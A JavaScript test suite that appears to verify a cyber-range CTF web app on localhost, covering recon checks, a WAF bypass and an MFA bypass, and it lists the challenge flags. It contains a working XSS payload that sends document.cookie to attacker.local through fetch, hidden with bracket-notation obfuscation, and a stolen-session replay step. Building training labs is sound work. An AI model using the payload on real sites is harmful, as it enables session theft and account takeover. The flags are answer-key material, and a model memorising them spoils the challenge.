import http from "http";
import app from "./src/server.js";

async function runComprehensiveTests() {
  console.log("===============================================================");
  printCentered("CYBER RANGE CTF COMPREHENSIVE VERIFICATION SUITE");
  console.log("===============================================================");

  const server = app.listen(3002, "127.0.0.1");

  function request(path, options = {}) {
    return new Promise((resolve, reject) => {
      const req = http.request({
        host: "127.0.0.1",
        port: 3002,
        path,
        method: options.method || "GET",
        headers: options.headers || {}
      }, (res) => {
        let body = "";
        res.on("data", chunk => body += chunk);
        res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body }));
      });
      req.on("error", reject);
      if (options.body) {
        req.write(options.body);
      }
      req.end();
    });
  }

  function printCentered(str) {
    const pad = Math.max(0, Math.floor((63 - str.length) / 2));
    console.log(" ".repeat(pad) + str);
  }

  let passed = 0;
  let failed = 0;

  function assert(condition, testName, flag = "") {
    if (condition) {
      console.log(`[PASS] ${testName} ${flag ? `--> Flag: ${flag}` : ""}`);
      passed++;
    } else {
      console.error(`[FAIL] ${testName}`);
      failed++;
    }
  }

  try {
    // -------------------------------------------------------------
    // PHASE 1: RECONNAISSANCE
    // -------------------------------------------------------------
    console.log("\n--- [PHASE 1: RECONNAISSANCE] ---");

    const rootRes = await request("/");
    assert(
      rootRes.headers["x-powered-by"] === "Node.js",
      "Explicit X-Powered-By: Node.js header exposure",
      "SCENARIO75{Node.js}"
    );

    const robotsRes = await request("/robots.txt");
    assert(
      robotsRes.body.includes("Disallow: /api/verify-mfa"),
      "robots.txt disallows /api/verify-mfa",
      "SCENARIO75{/api/verify-mfa}"
    );

    const dashUnauthorized = await request("/dashboard");
    assert(
      dashUnauthorized.status === 403 && dashUnauthorized.body.includes("Restricted Admin Area"),
      "Restricted admin area located at /dashboard returns 403",
      "SCENARIO75{/dashboard}"
    );

    const hasAscii = rootRes.body.includes("[ASCII ART]") || rootRes.body.includes("[o_o]");
    const hasRobotsHint = rootRes.body.includes("robots.txt");
    assert(
      hasAscii && hasRobotsHint,
      "ASCII art HTML comment hints at robots.txt in source code",
      "SCENARIO75{robots.txt}"
    );

    const setCookie = rootRes.headers["set-cookie"] || [];
    const cookieHeaderStr = Array.isArray(setCookie) ? setCookie.join("; ") : setCookie;
    assert(
      cookieHeaderStr.includes("pre_mfa_session="),
      "Pre-authentication cookie named pre_mfa_session",
      "SCENARIO75{pre_mfa_session}"
    );
    assert(
      cookieHeaderStr.includes("pending_mfa_verification"),
      "Pre-authentication cookie value pending_mfa_verification",
      "SCENARIO75{pending_mfa_verification}"
    );
    assert(
      !cookieHeaderStr.toLowerCase().includes("httponly"),
      "pre_mfa_session cookie has HttpOnly=False (allows JS access)",
      "SCENARIO75{False}"
    );

    // -------------------------------------------------------------
    // PHASE 2: DEFENSE EVASION (WAF & XSS)
    // -------------------------------------------------------------
    console.log("\n--- [PHASE 2: DEFENSE EVASION (WAF & XSS)] ---");

    // GET to /api/feedback is rejected
    const getFeedbackRes = await request("/api/feedback", { method: "GET" });
    assert(
      getFeedbackRes.status === 405,
      "Feedback endpoint exclusively requires POST method (rejects GET with 405)",
      "SCENARIO75{POST}"
    );

    // Naive WAF blocks <script>
    const scriptPayload = "message=" + encodeURIComponent("<script>alert(1)</script>");
    const scriptRes = await request("/api/feedback", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: scriptPayload
    });
    assert(
      scriptRes.status === 403 && scriptRes.body.includes("Blocked by WAF"),
      "Rudimentary WAF blocks <script> payload and returns 403",
      "SCENARIO75{403}"
    );

    // WAF bypass with <svg> and bracket-notation cookie access
    const bypassStr = "<svg onload=fetch('http://attacker.local/steal?c='+window['docu'+'ment']['coo'+'kie'])>";
    const bypassPayload = "department=SecOps&message=" + encodeURIComponent(bypassStr);
    const bypassRes = await request("/api/feedback", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: bypassPayload
    });
    assert(
      bypassRes.status === 200,
      "WAF successfully bypassed using <svg> with onload handler",
      "SCENARIO75{<svg>}"
    );
    assert(
      bypassStr.includes("window['docu'+'ment']['coo'+'kie']"),
      "WAF bypass uses JavaScript bracket notation obfuscation",
      "SCENARIO75{window['docu'+'ment']['coo'+'kie']}"
    );
    assert(
      bypassStr.includes("fetch("),
      "Environment supports fetch API for exfiltration",
      "SCENARIO75{fetch}"
    );

    // -------------------------------------------------------------
    // PHASE 3: INITIAL ACCESS (SESSION REPLAY & MFA BYPASS)
    // -------------------------------------------------------------
    console.log("\n--- [PHASE 3: INITIAL ACCESS (SESSION REPLAY & MFA BYPASS)] ---");

    // Access /dashboard with adm_sess prefix
    const dashAuthorized = await request("/dashboard", {
      headers: { "Cookie": "adm_sess=adm_stolen_replay_token_12345" }
    });
    assert(
      dashAuthorized.status === 200,
      "Replaying stolen cookie with prefix adm_sess grants access bypassing MFA",
      "SCENARIO75{adm_sess}"
    );
    assert(
      dashAuthorized.body.includes('class="xss-payload"'),
      "Stored payload is visually reflected inside container with CSS class xss-payload",
      "SCENARIO75{xss-payload}"
    );
    assert(
      dashAuthorized.body.includes("SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}"),
      "Victory flag embedded deep within administrative dashboard",
      "SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}"
    );

    // -------------------------------------------------------------
    // FLAG SUBMISSION & CHALLENGE TRACKING PORTAL (/flag)
    // -------------------------------------------------------------
    console.log("\n--- [FLAG TRACKER & SUBMISSION PORTAL (/flag)] ---");

    // Reset before tests
    await request("/flag/reset", { method: "POST", headers: { "Accept": "application/json" } });

    const flagPageRes = await request("/flag");
    assert(
      flagPageRes.status === 200 && flagPageRes.body.includes("Flag Submission & Challenge Tracker"),
      "GET /flag serves interactive challenge tracker and submission portal"
    );

    const flagStatusRes = await request("/api/flag/status", { headers: { "Accept": "application/json" } });
    const statusData = JSON.parse(flagStatusRes.body);
    assert(
      flagStatusRes.status === 200 && statusData.challenges?.length === 33 && statusData.summary?.totalChallenges === 33,
      "GET /api/flag/status exposes all 33 CTF challenges and completion summary"
    );

    const submitRes = await request("/flag", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
      body: JSON.stringify({ flag: "SCENARIO75{Node.js}" })
    });
    const submitData = JSON.parse(submitRes.body);
    assert(
      submitRes.status === 200 && submitData.success === true && submitData.challenge?.id === "red-01",
      "POST /flag validates discovered flag and tracks challenge as submitted"
    );

    const duplicateRes = await request("/flag", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
      body: JSON.stringify({ flag: "SCENARIO75{Node.js}" })
    });
    const dupData = JSON.parse(duplicateRes.body);
    assert(
      duplicateRes.status === 409 && dupData.alreadySubmitted === true,
      "POST /flag accurately identifies duplicate flag submissions"
    );

    const resetRes = await request("/flag/reset", {
      method: "POST",
      headers: { "Accept": "application/json" }
    });
    const resetData = JSON.parse(resetRes.body);
    assert(
      resetRes.status === 200 && resetData.success === true,
      "POST /flag/reset successfully resets challenge tracker state"
    );

    console.log("\n===============================================================");
    console.log(`TOTAL RESULTS: ${passed} PASSED, ${failed} FAILED.`);
    console.log("===============================================================");

    server.close(() => {
      process.exit(failed > 0 ? 1 : 0);
    });

  } catch (err) {
    server.close();
    console.error("Test failed with exception:", err);
    process.exit(1);
  }
}

runComprehensiveTests();
